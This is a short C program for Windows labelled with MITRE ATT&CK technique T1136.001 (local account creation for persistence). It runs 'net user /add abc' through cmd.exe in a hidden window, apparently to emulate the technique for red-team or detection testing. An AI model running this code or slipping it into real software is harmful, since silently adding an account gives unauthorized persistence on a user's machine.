// Link      = https://attack.mitre.org/techniques/T1136/001/
// Technique = Create Account: Local Account
// ID        = T1136.001
// Tactics   = Persistence

#include <windows.h>

#define RUN(to_run) ShellExecuteA(NULL,"open","cmd.exe",to_run ,NULL,SW_HIDE);

int main() {
    RUN("net user /add abc");
    return 0;
}